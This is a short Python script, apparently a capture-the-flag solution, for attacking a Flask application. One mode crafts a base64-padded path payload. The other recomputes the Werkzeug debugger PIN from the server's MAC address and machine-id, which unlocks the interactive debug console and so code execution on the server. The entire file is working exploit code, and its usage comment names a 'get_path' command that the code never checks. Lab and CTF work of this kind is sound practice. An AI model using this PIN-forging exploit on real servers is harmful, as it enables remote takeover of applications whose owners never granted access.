import sys
import base64
import hashlib

# Usage:
# - python3 solution.py get_path <file_path_with_only_valid_b64>
# - python3 solution.py generate_pin <mac_address> <machine_id>

if sys.argv[1] == "send":
    payload_path = "/" * (-len(sys.argv[2])%4) + sys.argv[2]
    open("payload.txt", "wb").write(base64.b64decode(payload_path.encode()))
    print(f"Visit: {payload_path}")
elif sys.argv[1] == "generate_pin":
    mac_address = str(int(sys.argv[2].replace(":", ""), 16))
    h = hashlib.sha1()
    public_bits = ["jacobi", "flask.app", "wsgi_app", "/usr/local/lib/python3.13/site-packages/flask/app.py"]
    private_bits = [mac_address, sys.argv[3]]

    for bit in public_bits + private_bits:
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]


    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
        else:
            rv = num
    print(rv)
